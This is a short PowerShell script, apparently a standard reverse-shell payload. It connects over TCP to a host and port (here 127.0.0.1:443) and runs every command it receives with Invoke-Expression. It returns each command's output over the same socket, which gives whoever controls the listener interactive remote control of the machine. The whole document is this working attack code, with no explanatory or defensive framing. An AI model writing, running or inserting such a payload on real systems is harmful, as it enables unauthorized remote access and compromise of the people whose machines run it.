$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1",443);
$stream = $client.GetStream();
[System.byte[]]$bytes = 0..65535|%{0};

while(($i = $stream.Read($bytes, 0, 65536)) -ne 0) 
	{
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2 = $sendback + "# ";
	$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush()
	};
$client.Close()
